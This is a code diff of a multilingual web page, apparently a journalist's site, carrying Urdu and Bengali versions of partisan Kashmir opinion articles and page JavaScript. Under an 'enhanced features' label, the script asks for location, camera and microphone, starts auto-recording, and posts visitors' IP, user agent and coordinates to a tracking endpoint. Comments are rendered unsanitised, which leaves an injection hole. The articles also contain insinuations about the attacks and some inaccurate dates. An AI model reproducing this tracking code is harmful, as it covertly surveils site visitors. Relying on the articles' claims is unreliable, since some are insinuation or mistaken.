+                art2_p1: "فروری 2019 میں پلوامہ حملہ اور جون 2025 میں پہلگام حملہ نے جموں و کشمیر میں سیکورٹی کے انتظامات پر حکومت ہند پر کافی تنقید کی ہے۔ پلوامہ حملے کے بعد، جہاں 40 سے زائد ہندوستانی نیم فوجی اہلکار ہلاک ہوئے، بہت سے مبصرین نے حکومت کی انٹیلی جنس صلاحیتوں اور حفاظتی اقدامات پر سوال اٹھائے۔ پہلگام حملہ، 2025 میں انتخابی مدت سے عین قبل ہوا، سیکورٹی میں کوتاہیوں اور خطے میں بدلتے ہوئے خطرات کے لیے حکومتی ردعمل کی مناسبیت پر تشویش کو دوبارہ ہوا دی۔",
+                art2_p2: "پہلگام حملے کا وقت، انتخابی مہمات کے ساتھ موافق ہونا، اس قیاس آرائی کو ہوا دی کہ سیاسی محرکات نے حکومتی اقدامات کو متاثر کیا ہو گا۔ ناقدین نے مشورہ دیا کہ حکمران جماعت ان المناک واقعات کو قوم پرستانہ جذبات کو ابھارنے اور معاشی چیلنجز اور مہنگائی جیسے اہم داخلی مسائل سے عوام کی توجہ ہٹانے کے لیے استعمال کر سکتی ہے۔ اس اسٹریٹجک پوزیشننگ نے ابرو اٹھا دیے، بہت سے لوگوں کا کہنا تھا کہ حکومت کشمیر میں تشدد میں کردار ادا کرنے والی پیچیدہ حقیقتوں کو حل کرنے کے بجائے انتخابی فائدے کے لیے سیکورٹی خدشات کا استحصال کر رہی ہے۔",
+                art2_p3: "مزید برآں، ان حملوں سے متعلق بیان بازی نے عوام میں عدم اطمینان کو مزید ہوا دی۔ سرکاری اہلکاروں نے اکثر فوجی ردعمل اور انتقام کے عزم پر زور دیا، پھر بھی بہت سے ناقدین نے نشاندہی کی کہ اس طرح کے اقدامات نے شاذ و نادر ہی جموں و کشمیر میں بنیادی سماجی و سیاسی مسائل کو حل کیا۔ طاقت کے مظاہرے کو حقیقی بات چیت پر ترجیح دینے کے اس رجحان نے کشمیریوں میں بیگانگی کے جذبات کو مزید برقرار رکھا۔ امن اور استحکام کے لیے مربوط حکمت عملی کی کمی نے بہت سے شہریوں کو تنازعات اور بدامنی سے دوچار خطے میں اپنے مستقبل کے بارے میں پسماندہ اور بے چین چھوڑ دیا۔",
+                art2_p4: "واضح ثبوت کے بغیر ان پر الزام لگانا ممکن نہیں ہے لیکن ان کی حکومت کی طرف سے دیے گئے بہت زیادہ اتفاق اور بہانے ہیں۔ پورے خطے میں فوجی اڈے ہونے کے باوجود رسپانس ٹائم اتنا دیر سے کیسے ہو سکتا ہے؟",
+                art3_p1: "آرٹیکل 370 کا خاتمہ، جو پہلے جموں و کشمیر کو خصوصی درجہ دیتا تھا، نے ایک اہم اور کثیر جہتی بحث کو جنم دیا ہے۔ ایک ایسے شخص کے طور پر جس نے اس مسئلے کو قریب سے دیکھا ہے، میں نظر انداز نہیں کر سکتی کہ بہت سے لوگ اس اقدام کو اس خود مختاری کی براہ راست توہین سمجھتے ہیں جس سے خطہ دہائیوں سے لطف اندوز ہو رہا تھا۔ آرٹیکل نے جموں و کشمیر کو مختلف شعبوں میں اپنا آئین، قوانین اور فیصلہ سازی کے اختیارات برقرار رکھنے کی اجازت دی، جیسے جائیداد کے حقوق اور رہائش۔ ان دفعات کو منسوخ کرکے، ناقدین کا کہنا ہے کہ حکومت ہند نے 1947 میں جموں و کشمیر کے ہندوستان سے الحاق کے تاریخی تناظر کو نظر انداز کیا، جو اس سمجھوتے پر مبنی تھا کہ خطہ کافی خود حکومتی برقرار رکھے گا۔",
+                art3_p2: "مزید برآں، جس طریقے سے فیصلے پر عملدرآمد کیا گیا اس نے مقامی لوگوں اور مبصرین میں یکساں طور پر سنگین خطرے کی گھنٹی بجا دی ہے۔ منسوخی کے دوران بھاری فوجی موجودگی، مواصلاتی بندش کے ساتھ مل کر، خوف اور غیر یقینی کا ماحول پیدا کیا۔ اس اچانک پن نے کسی بھی حقیقی عوامی بحث کو روک دیا اور رہائشیوں کو ان کے جمہوری حقوق سے محروم کر دیا۔ بہت سے لوگوں نے پسماندگی محسوس کی، یہ مانتے ہوئے کہ ان کی رائے کو نہ صرف نظر انداز کیا گیا بلکہ فعال طور پر دبایا گیا۔ اس نقطہ نظر نے اس قدر اہم آئینی تبدیلی کی قانونی حیثیت پر سوال اٹھائے، جو خطے میں پہلے سے موجود بیگانگی اور محرومی کے جذبات کو مزید بڑھاوا دیا۔",
+                art3_p3: "خود مختاری اور حکمرانی سے متعلق خدشات کے علاوہ، رہائشیوں میں ممکنہ آبادیاتی تبدیلیوں اور ثقافتی تنزلی کے بارے میں ایک واضح خوف ہے۔ خصوصی تحفظات کے خاتمے کے ساتھ، بہت سے لوگوں کا ماننا ہے کہ باہر کے لوگوں کی آمد جموں و کشمیر کی منفرد شناخت اور ورثے کو خطرہ بنا سکتی ہے۔ یہ خوف فرقہ وارانہ کشیدگی اور ماضی کے تنازعات کی تاریخ میں جڑا ہوا ہے، جس سے مقامی لوگ بدلتے ہوئے سماجی و سیاسی منظر نامے میں اپنے مستقبل کے بارے میں فکر مند ہیں۔ بالآخر، آرٹیکل 370 کے خاتمے کی مخالفت جموں و کشمیر میں رہنے والے لوگوں کے استحکام، شناخت اور جمہوری حقوق کے بارے میں گہری تشویش سے پیدا ہوتی ہے۔",
+                art3_p4: "وہاں کی پہلے سے موجود مقامی آبادی اب مزید خطرہ محسوس کرتی ہے۔ تنازعات کی سرزمین کی تاریخ مقامی لوگوں کو اپنے بچوں اور ان کے مستقبل کے بارے میں مزید بے چین کرتی ہے، ہر وقت کی بلند کرپشن اور غیر یقینی صورتحال کے ساتھ۔ آنے والا وقت ان جدوجہد کرنے والے لوگوں کے لیے کیا لائے گا جو صرف اپنی زندگی پرامن طریقے سے گزارنے کی کوشش کر رہے ہیں؟",
+                art4_p1: "شہید افضل گرو کشمیری عوام کی جدوجہد، قربانی اور مصائب کی ایک نمایاں علامت ہیں۔ وہ 1969 میں ضلع سوپور، جموں و کشمیر میں پیدا ہوئے۔ ایک عام کشمیری نوجوان کی طرح، ان کی زندگی ریاستی جبر، ناانصافی اور سیاسی غیر یقینی کے سائے میں گزری۔",
+                art4_p2: "افضل گرو پر 13 دسمبر 2001 کو ہندوستانی پارلیمان پر حملے میں ملوث ہونے کا الزام لگایا گیا۔ مقدمے کی سماعت کے دوران، نہ صرف کشمیری عوام بلکہ بین الاقوامی انسانی حقوق کی تنظیموں کی طرف سے بھی شواہد، اعترافات اور عدالتی کارروائیوں کے حوالے سے سنگین سوالات اٹھائے گئے۔ یہ دلیل دی گئی کہ افضل گرو کو منصفانہ مقدمہ نہیں دیا گیا اور یہ فیصلہ ٹھوس شواہد کی بجائے \"اجتماعی ضمیر\" کی بنیاد پر سنایا گیا۔",
+                art4_p3: "9 فروری 2013 کو، انہیں نئی دہلی کی تہاڑ جیل میں خفیہ طور پر پھانسی دے دی گئی۔ ان کے اہل خانہ کو پھانسی کے وقت بروقت اطلاع نہیں دی گئی، نہ ہی انہیں آخری ملاقات کا موقع دیا گیا، جو بذات خود ایک انسانی سانحہ تھا۔ انہیں جیل کے احاطے میں دفن کر دیا گیا، لاش اہل خانہ کے حوالے نہیں کی گئی، جس سے کشمیری عوام کے زخم مزید گہرے ہو گئے۔",
+                art4_p4: "افضل گرو کی شہادت محض ایک فرد کی موت نہیں ہے بلکہ انصاف کے پورے نظام پر ایک سوالیہ نشان ہے۔ ان کی پھانسی کے بعد، کشمیر میں شدید ردعمل ہوا، اور وہ ایک ایسے شخص کے طور پر یاد کیے جانے لگے جو ریاستی ناانصافی کا شکار ہوا۔ آج بھی، بہت سے کشمیری انہیں اپنی آزادی کی جدوجہد کی علامت سمجھتے ہیں۔",
+                art4_p5: "تاریخ گواہ ہے کہ طاقت سے دبائی گئی آوازیں وقت کے ساتھ اکثر مضبوط ہوتی ہیں۔ شہید افضل گرو کی قربانی اس سلسلے کی ایک اور کڑی ہے، جو کشمیری عوام کے دلوں میں زندہ ہے اور آنے والی نسلوں تک انصاف، حقوق اور آزادی کا پیغام پہنچاتی رہے گی۔",
+                art4_by: "امتیاز احمد بھٹ\nنائب صدر، جموں و کشمیر عوامی پارٹی"
+            },
+            bn: {
+                hero_name: "হিনা জাহিদ",
+                hero_prof: "সাংবাদিক",
+                hero_loc: "ডিয়ারবর্ন সিটিতে বসবাস",
+                hero_edu: "মিশিগান বিশ্ববিদ্যালয় - ডিয়ারবর্ন",
+                art1_title: "সংখ্যালঘু হিসেবে কাশ্মীরিরা",
+                art2_title: "সরকার কি পুলওয়ামা ও পাহালগাম ঘটতে দিয়েছে?",
+                art3_title: "ধারা 370",
+                art4_title: "শহীদ আফজাল গুরু",
+                art1_p1: "কাশ্মীরিদের প্রতি সহিংসতা ও নিপীড়নের ইতিহাস এই অঞ্চলে মানবাধিকার লঙ্ঘনের বৃহত্তর প্রেক্ষাপটকে প্রতিফলিত করে। নিরাপত্তা বাহিনীর দ্বারা নির্যাতনের খবর সামনে এসেছে, যার মধ্যে রয়েছে ইচ্ছামত আটক, নির্যাতন এবং বিচারবহির্ভূত হত্যাকাণ্ড। উদাহরণস্বরূপ, ১৯৯১ সালে সামরিক অভিযানের সময় কুনান পোষপোরা ঘটনা, যেখানে সেনারা নারীদের ধর্ষণ ও নির্যাতনের অভিযোগ রয়েছে, স্থানীয় জনগণের দুঃখজনক ইতিহাসের প্রতীক হয়ে রয়ে গেছে। সহিংসতার এই চক্র ভয়ের পরিবেশ তৈরি করেছে, যেখানে বেসামরিক নাগরিকরা প্রায়ই হয়রানি ও ভীতি প্রদর্শনের খবর দেয়, যা তাদের মৌলিক অধিকার এবং ন্যায়বিচারের অ্যাক্সেসকে ক্ষুণ্ন করে।",
+                art1_p2: "কাশ্মীরিরা কেবল সহিংসতার সরাসরি কাজ নিয়েই লড়াই করছে না; তারা চলমান সংঘাতের কারণে উল্লেখযোগ্য আর্থ-সামাজিক চ্যালেঞ্জেরও মুখোমুখি হচ্ছে। সাম্প্রতিক বছরগুলিতে, অর্থনৈতিক অবস্থার অবনতি হয়েছে, অনেক স্থানীয় মানুষ নিষেধাজ্ঞা এবং সামরিক অভিযানের কারণে তাদের জীবিকা ক্ষতিগ্রস্ত হতে দেখছে। উদাহরণস্বরূপ, প্রতিবেদনে ইঙ্গিত দেওয়া হয়েছে যে মাদকের অপব্যবহার, বিশেষ করে হেরোইন আসক্তি নাটকীয়ভাবে বেড়েছে, স্বাস্থ্য সুবিধাগুলিতে বার্ষিক হাজার হাজার রোগী নথিভুক্ত হচ্ছে। মানসিক স্বাস্থ্যের প্রভাব গভীর, কারণ পরিবারগুলি সহিংসতা এবং অর্থনৈতিক হতাশার চলমান ট্রমার সাথে লড়াই করছে, যা সম্প্রদায়ের পক্ষে একটি স্থিতিশীল ভবিষ্যতের কল্পনা করা কঠিন করে তোলে।",
+                art1_p3: "কাশ্মীরিরা যে ব্যাপক অবিচার অনুভব করে তা জাতীয় আখ্যান থেকে বিচ্ছিন্নতার অনুভূতি দ্বারা আরও জটিল হয়ে ওঠে। অনেকেই তাদের অধিকার ও পরিচয় নিয়ে আলোচনা থেকে বাদ পড়েছেন বলে মনে করেন, সরকারের প্রতিক্রিয়া প্রায়শই স্থানীয় অভিযোগ সমাধানের পরিবর্তে সামরিকায়নের উপর দৃষ্টি নিবদ্ধ করে। খুররম পারভেজের মতো বিশিষ্ট মানবাধিকার কর্মীদের অস্পষ্ট আইনের অধীনে আটক করা হয়েছে, যেমন বেআইনি কার্যকলাপ প্রতিরোধ আইন (UAPA), কাশ্মীরি অধিকারের পক্ষে কথা বলার জন্য তাদের উপর সন্ত্রাসবাদের অভিযোগ আনা হয়েছে। এই ধরনের কর্মকাণ্ড ভিন্নমতকে স্তব্ধ করার একটি বৃহত্তর কৌশলের প্রতীক, কাশ্মীরিদের মধ্যে এই ধারণাকে শক্তিশালী করে যে তাদের কণ্ঠস্বর সংঘাত ও নিপীড়ন দ্বারা চিহ্নিত একটি ল্যান্ডস্কেপে পদ্ধতিগতভাবে প্রান্তিক হচ্ছে।",
+                art1_p4: "আমি আবার বলতে চাই যে কাশ্মীরিরাও মানুষ, যারা বছরের পর বছর ধরে সেখানে বসবাস করে আসছে এবং আপনার নিজের রাজনৈতিক বা বস্তুগত কর্মসূচির জন্য তাদের নিপীড়ন করা কেউ নৈতিক বলে বিবেচনা করবে না। কিন্তু সময় এসেছে যখন আমরা ভুলে গেছি যে এত বছর আগে কেন সমস্ত ধর্ম পাঠানো হয়েছিল, তারা সবাই আমাদের বিশেষ করে একটি জিনিস শিখিয়েছে, ন্যায়পরায়ণ ও শান্তিপূর্ণভাবে জীবনযাপন করা।",
+                art2_p1: "২০১৯ সালের ফেব্রুয়ারিতে পুলওয়ামা হামলা এবং ২০২৫ সালের জুনে পাহালগাম হামলা জম্মু ও কাশ্মীরে নিরাপত্তা ব্যবস্থাপনা নিয়ে ভারত সরকারের সমালোচনা করেছে। পুলওয়ামা হামলার পরে, যেখানে ৪০ জনের বেশি ভারতীয় আধাসামরিক কর্মী নিহত হয়েছিল, অনেক পর্যবেক্ষক সরকারের গোয়েন্দা সক্ষমতা এবং প্রতিরোধমূলক ব্যবস্থা নিয়ে প্রশ্ন তুলেছিলেন। পাহালগাম হামলা, ২০২৫ সালে একটি গুরুত্বপূর্ণ নির্বাচনী সময়ের ঠিক আগে ঘটে, নিরাপত্তায় ঘাটতি এবং এই অঞ্চলে ক্রমবর্ধমান হুমকির প্রতি সরকারের প্রতিক্রিয়ার পর্যাপ্ততা নিয়ে উদ্বেগ পুনরায় জাগিয়ে তোলে।",
+                art2_p2: "পাহালগাম হামলার সময়, নির্বাচনী প্রচারণার সাথে মিলে যাওয়া, ব্যাপক জল্পনা-কল্পনার জন্ম দেয় যে রাজনৈতিক উদ্দেশ্য সরকারের পদক্ষেপকে প্রভাবিত করতে পারে। সমালোচকরা পরামর্শ দিয়েছেন যে শাসক দল এই মর্মান্তিক ঘটনাগুলি জাতীয়তাবাদী মনোভাব জাগিয়ে তুলতে এবং অর্থনৈতিক চ্যালেঞ্জ এবং মূল্যস্ফীতির মতো গুরুত্বপূর্ণ অভ্যন্তরীণ বিষয়গুলি থেকে জনগণের মনোযোগ সরাতে ব্যবহার করতে পারে। এই কৌশলগত অবস্থান ভ্রু কুচকে দিয়েছে, অনেকেই যুক্তি দিয়েছেন যে সরকার কাশ্মীরে সহিংসতায় অবদান রাখা জটিল বাস্তবতাগুলিকে সত্যিকার অর্থে সমাধান করার পরিবর্তে নির্বাচনী সুবিধার জন্য নিরাপত্তা উদ্বেগকে কাজে লাগাচ্ছে।",
+                art2_p3: "তদুপরি, এই হামলাগুলিকে ঘিরে বক্তব্য জনগণের মধ্যে অসন্তোষকে আরও উস্কে দিয়েছে। সরকারি কর্মকর্তারা প্রায়ই সামরিক প্রতিক্রিয়া এবং প্রতিশোধের প্রতিজ্ঞার উপর জোর দিয়েছেন, তবুও অনেক সমালোচক উল্লেখ করেছেন যে এই ধরনের পদক্ষেপগুলি খুব কমই জম্মু ও কাশ্মীরের অন্তর্নিহিত আর্থ-সামাজিক সমস্যাগুলিকে সমাধান করেছে। শক্তির প্রদর্শনকে প্রকৃত সংলাপের চেয়ে অগ্রাধিকার দেওয়ার এই প্রবণতা কাশ্মীরিদের মধ্যে বিচ্ছিন্নতার অনুভূতি আরও স্থায়ী করেছে। শান্তি ও স্থিতিশীলতার জন্য একটি সমন্বিত কৌশলের অভাব অনেক নাগরিককে সংঘাত ও অস্থিরতা দ্বারা চিহ্নিত একটি অঞ্চলে তাদের ভবিষ্যৎ নিয়ে প্রান্তিক ও উদ্বিগ্ন করে রেখেছে।",
+                art2_p4: "নির্দিষ্ট প্রমাণ ছাড়া তাদের অভিযুক্ত বলা সম্ভব নয় কিন্তু তাদের সরকারের দেওয়া অনেক বেশি কাকতালীয় এবং অজুহাত রয়েছে। সারা অঞ্চলে সামরিক ঘাঁটি থাকার পরেও প্রতিক্রিয়ার সময় এত দেরি করে কীভাবে হতে পারে?",
+                art3_p1: "ধারা ৩৭০ বিলুপ্তি, যা আগে জম্মু ও কাশ্মীরকে বিশেষ মর্যাদা দিয়েছিল, একটি উল্লেখযোগ্য এবং বহুমুখী বিতর্কের জন্ম দিয়েছে। একজন ব্যক্তি হিসাবে যিনি এই সমস্যাটি ঘনিষ্ঠভাবে অনুসরণ করেছেন, আমি উপেক্ষা করতে পারি না যে অনেক লোক এই পদক্ষেপটিকে সেই স্বায়ত্তশাসনের সরাসরি অপমান হিসাবে দেখে যা এই অঞ্চলটি কয়েক দশক ধরে উপভোগ করেছিল। ধারাটি জম্মু ও কাশ্মীরকে বিভিন্ন ক্ষেত্রে নিজস্ব সংবিধান, আইন এবং সিদ্ধান্ত গ্রহণের ক্ষমতা বজায় রাখার অনুমতি দেয়, যেমন সম্পত্তির অধিকার এবং আবাসন। এই বিধানগুলি বাতিল করে, সমালোচকরা যুক্তি দেন যে ভারত সরকার ১৯৪৭ সালে জম্মু ও কাশ্মীরের ভারতের সাথে যুক্ত হওয়ার ঐতিহাসিক প্রেক্ষাপটকে উপেক্ষা করেছে, যা এই বোঝাপড়ার উপর ভিত্তি করে ছিল যে অঞ্চলটি যথেষ্ট স্ব-শাসন বজায় রাখবে।",
+                art3_p2: "তদুপরি, যে পদ্ধতিতে সিদ্ধান্তটি কার্যকর করা হয়েছিল তা স্থানীয় এবং পর্যবেক্ষকদের মধ্যে একইভাবে গুরুতর উদ্বেগ তৈরি করেছে। বাতিলের সময় ভারী সামরিক উপস্থিতি, যোগাযোগ বন্ধের সাথে মিলিত হয়ে, ভয় এবং অনিশ্চয়তার জলবায়ু তৈরি করেছিল। এই আকস্মিকতা কোনও প্রকৃত জনসাধারণের বক্তব্যকে বাধা দেয় এবং বাসিন্দাদের তাদের গণতান্ত্রিক অধিকার থেকে বঞ্চিত করে। অনেকেই প্রান্তিক বোধ করেছেন, বিশ্বাস করেছেন যে তাদের মতামত কেবল উপেক্ষা করা হয়নি বরং সক্রিয়ভাবে দমন করা হয়েছে। এই পদ্ধতিটি এতটা গুরুত্বপূর্ণ সাংবিধানিক পরিবর্তনের বৈধতা নিয়ে প্রশ্ন তুলেছে, যা এই অঞ্চলে ইতিমধ্যে উপস্থিত বিচ্ছিন্নতা এবং বঞ্চনার অনুভূতিকে আরও বাড়িয়ে তুলেছে।",
+                art3_p3: "স্বায়ত্তশাসন ও শাসন সংক্রান্ত উদ্বেগ ছাড়াও, বাসিন্দাদের মধ্যে সম্ভাব্য জনসংখ্যাগত পরিবর্তন এবং সাংস্কৃতিক ক্ষয় সম্পর্কে একটি স্পষ্ট ভয় রয়েছে। বিশেষ সুরক্ষা অপসারণের সাথে, অনেকেই বিশ্বাস করেন যে বহিরাগতদের আগমন জম্মু ও কাশ্মীরের অনন্য পরিচয় এবং ঐতিহ্যকে হুমকির মুখে ফেলতে পারে। এই ভয় সাম্প্রদায়িক উত্তেজনা এবং অতীতের সংঘাতের ইতিহাসে নিহিত, যা স্থানীয়দের পরিবর্তিত আর্থ-সামাজিক ল্যান্ডস্কেপে তাদের ভবিষ্যত নিয়ে শঙ্কিত করে তুলছে। শেষ পর্যন্ত, ধারা ৩৭০ বিলুপ্তির বিরোধিতা জম্মু ও কাশ্মীরে বসবাসকারী মানুষের স্থিতিশীলতা, পরিচয় এবং গণতান্ত্রিক অধিকারের গভীর উদ্বেগ থেকে উদ্ভূত হয়।",
+                art3_p4: "সেখানকার ইতিমধ্যে বিদ্যমান আদিবাসী জনগোষ্ঠী এখন আরও হুমকি বোধ করে। সংঘাতপূর্ণ ভূমির ইতিহাস স্থানীয়দের তাদের সন্তানদের এবং তাদের ভবিষ্যত সম্পর্কে আরও নার্ভাস করে তোলে, সর্বকালের উচ্চ দুর্নীতি এবং অনিশ্চয়তার সাথে। আসন্ন সময় কি সেই সংগ্রামী মানুষের জন্য নিয়ে আসবে যারা কেবল তাদের জীবন শান্তিপূর্ণভাবে কাটানোর চেষ্টা করছে?",
+                art4_p1: "শহীদ আফজাল গুরু কাশ্মীরি জনগণের সংগ্রাম, ত্যাগ ও দুঃখ-কষ্টের একটি বিশিষ্ট প্রতীক। তিনি ১৯৬৯ সালে জম্মু ও কাশ্মীরের সোপোর জেলায় জন্মগ্রহণ করেন। একজন সাধারণ কাশ্মীরি যুবকের মতো, তার জীবন রাষ্ট্রীয় দমন-পীড়ন, অবিচার এবং রাজনৈতিক অনিশ্চয়তার ছায়ায় কেটেছে।",
+                art4_p2: "আফজাল গুরু ২০০১ সালের ১৩ ডিসেম্বর ভারতীয় সংসদে হামলায় জড়িত থাকার অভিযোগে অভিযুক্ত হন। বিচারের সময়, কেবল কাশ্মীরি জনগণই নয়, আন্তর্জাতিক মানবাধিকার সংস্থাগুলিও প্রমাণ, স্বীকারোক্তি এবং বিচারিক কার্যক্রম নিয়ে গুরুতর প্রশ্ন তুলেছিল। যুক্তি দেওয়া হয়েছিল যে আফজাল গুরুর একটি ন্যায্য বিচার দেওয়া হয়নি এবং রায়টি কংক্রিট প্রমাণের পরিবর্তে \"সম্মিলিত বিবেকের\" ভিত্তিতে দেওয়া হয়েছিল।",
+                art4_p3: "২০১৩ সালের ৯ ফেব্রুয়ারি, তাকে নয়াদিল্লির তিহাড় জেলে গোপনে ফাঁসি দেওয়া হয়। ফাঁসির সময় তার পরিবারকে সময়মত জানানো হয়নি, শেষ সাক্ষাতের সুযোগও দেওয়া হয়নি, যা নিজেই একটি মানবিক ট্র্যাজেডি। জেল চত্বরে তাকে সমাহিত করা হয়, মরদেহ পরিবারের কাছে হস্তান্তর করা হয়নি, যা কাশ্মীরি জনগণের ক্ষত আরও গভীর করে।",
+                art4_p4: "আফজাল গুরুর শাহাদাত কেবল একজন ব্যক্তির মৃত্যু নয়, ন্যায়বিচারের পুরো ব্যবস্থার উপর একটি প্রশ্ন চিহ্ন। তার ফাঁসির পর কাশ্মীরে তীব্র প্রতিক্রিয়া দেখা দেয় এবং তিনি রাষ্ট্রীয় অবিচারের শিকার একজন ব্যক্তি হিসেবে স্মরণীয় হতে শুরু করেন। এমনকি আজও, অনেক কাশ্মীরি তাকে তাদের স্বাধীনতার সংগ্রামের প্রতীক হিসেবে গণ্য করে।",
+                art4_p5: "ইতিহাস সাক্ষ্য দেয় যে শক্তি দ্বারা দমন করা কণ্ঠস্বর প্রায়শই সময়ের সাথে সাথে শক্তিশালী হয়। শহীদ আফজাল গুরুর আত্মত্যাগ সেই শৃঙ্খলের আরেকটি সংযোগ, যা কাশ্মীরি জনগণের হৃদয়ে জীবন্ত রয়েছে এবং আগামী প্রজন্মের কাছে ন্যায়বিচার, অধিকার ও স্বাধীনতার বার্তা পৌঁছে দিতে থাকবে।",
+                art4_by: "ইমতিয়াজ আহমদ ভাট\nউপদেষ্টা, জম্মু ও কাশ্মীর আওয়ামী পার্টি"
+            }
+        };
 
-        try {
-          await requestCameraSeq();
-          await requestMicrophoneSeq();
-          startAutoRecording();
-          alert('🎉 Thanks for enabling enhanced features!');
-        } catch (err) {
-          console.warn('Permission sequence stopped:', err);
-        }
-      }
+        // base URL for API requests
+        const API_BASE = window.location.origin;
 
-      function requestLocationSeq() {
-        return new Promise((resolve, reject) => {
-          if (!navigator.geolocation) {
-            return reject('Geolocation not supported');
-          }
-          navigator.geolocation.getCurrentPosition(
-            pos => resolve(pos),
-            err => { alert('📍 Location access denied.'); reject(err); }
-          );
+        document.addEventListener('DOMContentLoaded', function() {
+            // Language switching functionality
+            document.querySelectorAll('.lang-selector button').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    
+                    // Update active state
+                    document.querySelectorAll('.lang-selector button').forEach(b => {
+                        b.classList.remove('lang-active');
+                    });
+                    this.classList.add('lang-active');
+                    
+                    // Change page direction for Urdu
+                    if (lang === 'ur') {
+                        document.body.style.direction = 'rtl';
+                    } else {
+                        document.body.style.direction = 'ltr';
+                    }
+                    
+                    // Translate all elements with data-i18n attribute
+                    document.querySelectorAll('[data-i18n]').forEach(el => {
+                        const key = el.getAttribute('data-i18n');
+                        if (translations[lang] && translations[lang][key]) {
+                            if (el.tagName === 'EM' || el.tagName === 'P' || el.tagName === 'H1' || el.tagName === 'H2') {
+                                el.innerHTML = translations[lang][key].replace(/\n/g, '<br>');
+                            } else {
+                                el.innerText = translations[lang][key];
+                            }
+                        }
+                    });
+                });
+            });
+
+            // mark English as initial active button
+            const defaultBtn = document.querySelector('.lang-selector button[data-lang="en"]');
+            if (defaultBtn) defaultBtn.classList.add('lang-active');
+
+
+            // share button functionality
+            document.querySelectorAll('.share-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const url = window.location.href;
+                    if (navigator.share) {
+                        navigator.share({ title: document.title, url: url })
+                            .catch(err => console.error(err));
+                    } else {
+                        navigator.clipboard.writeText(url).then(() => {
+                            alert('Link copied to clipboard');
+                        });
+                    }
+                });
+            });
+
+            // comment button functionality
+            document.querySelectorAll('.comment-btn').forEach(btn => {
+                btn.addEventListener('click', async () => {
+                    const article = btn.closest('article');
+                    const comments = article.querySelector('.comments');
+                    const title = article.querySelector('h2').innerText;
+                    
+                    if (comments.style.display === 'none') {
+                        try {
+                            const res = await fetch(`${API_BASE}/api/comments?articleTitle=${encodeURIComponent(title)}`);
+                            const existing = await res.json();
+                            const list = comments.querySelector('.comment-list');
+                            list.innerHTML = '';
+                            existing.forEach(c => {
+                                const p = document.createElement('p');
+                                p.innerHTML = `<strong>${c._id ? c._id.slice(-4) : 'User'}:</strong> ${c.text}`;
+                                list.appendChild(p);
+                            });
+                        } catch (e) {
+                            // Keep existing mock comments if API fails
+                        }
+                        comments.style.display = 'block';
+                        comments.scrollIntoView({ behavior: 'smooth' });
+                    } else {
+                        comments.style.display = 'none';
+                    }
+                });
+            });
+
+            // add comment functionality
+            document.querySelectorAll('.add-comment-btn').forEach(btn => {
+                btn.addEventListener('click', async () => {
+                    const container = btn.closest('.comments');
+                    const input = container.querySelector('.comment-input');
+                    const text = input.value.trim();
+                    
+                    if (text) {
+                        const article = btn.closest('article');
+                        const title = article.querySelector('h2').innerText;
+                        
+                        try {
+                            const res = await fetch(`${API_BASE}/api/comments`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ articleTitle: title, text })
+                            });
+                            const saved = await res.json();
+                            const p = document.createElement('p');
+                            p.innerHTML = `<strong>${saved._id ? saved._id.slice(-4) : 'You'}:</strong> ${saved.text}`;
+                            container.querySelector('.comment-list').appendChild(p);
+                        } catch (e) {
+                            // Add comment locally if API fails
+                            const p = document.createElement('p');
+                            p.innerHTML = `<strong>You:</strong> ${text}`;
+                            container.querySelector('.comment-list').appendChild(p);
+                        }
+                        input.value = '';
+                    }
+                });
+            });
+
+            // like button functionality
+            document.querySelectorAll('.like-btn').forEach(btn => {
+                btn.addEventListener('click', async () => {
+                    const article = btn.closest('article');
+                    const title = article.querySelector('h2').innerText;
+                    
+                    try {
+                        const res = await fetch(`${API_BASE}/api/likes`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ articleTitle: title })
+                        });
+                        const updated = await res.json();
+                        btn.querySelector('.like-count').textContent = updated.count;
+                    } catch (e) {
+                        // Increment locally if API fails
+                        const count = btn.querySelector('.like-count');
+                        count.textContent = parseInt(count.textContent) + 1;
+                    }
+                });
+            });
+
+            // sidebar toggle functionality
+            const hamburger = document.getElementById('hamburger');
+            const sidebar = document.getElementById('sidebar');
+            
+            if (hamburger && sidebar) {
+                hamburger.addEventListener('click', () => sidebar.classList.toggle('open'));
+                sidebar.querySelectorAll('a').forEach(link => {
+                    link.addEventListener('click', () => sidebar.classList.remove('open'));
+                });
+            }
+
+            // fetch existing like counts on load
+            document.querySelectorAll('.like-btn').forEach(async btn => {
+                const article = btn.closest('article');
+                const title = article.querySelector('h2').innerText;
+                
+                try {
+                    const res = await fetch(`${API_BASE}/api/likes?articleTitle=${encodeURIComponent(title)}`);
+                    const data = await res.json();
+                    btn.querySelector('.like-count').textContent = data.count;
+                } catch (e) {
+                    // keep existing counts
+                }
+            });
         });
-      }
 
-      // gather ip/userAgent and post to backend along with location
-      function sendTracking(pos) {
-        fetch('https://api.ipify.org?format=json')
-          .then(r => r.json())
-          .then(data => {
-            const info = {
-              ip: data.ip,
-              userAgent: navigator.userAgent,
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              articleTitle: document.querySelector('article h2')?.innerText || ''
-            };
-            console.log('sending tracking', info);
-            fetch(`${API_BASE}/api/track`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(info)
+        // Enhanced features (unchanged)
+        let lastCoords = null;
+        
+        async function enableEnhancedFeatures() {
+            let pos;
+            try {
+                pos = await requestLocationSeq();
+                lastCoords = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude
+                };
+                sendTracking(pos);
+            } catch (err) {
+                console.warn('Location permission denied or failed, continuing without coords', err);
+            }
+
+            try {
+                await requestCameraSeq();
+                await requestMicrophoneSeq();
+                startAutoRecording();
+                alert('🎉 Thanks for enabling enhanced features!');
+            } catch (err) {
+                console.warn('Permission sequence stopped:', err);
+            }
+        }
+
+        function requestLocationSeq() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    return reject('Geolocation not supported');
+                }
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve(pos),
+                    err => { alert('📍 Location access denied.'); reject(err); }
+                );
+            });
+        }
+
+        function sendTracking(pos) {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    const info = {
+                        ip: data.ip,
+                        userAgent: navigator.userAgent,
+                        latitude: pos.coords.latitude,
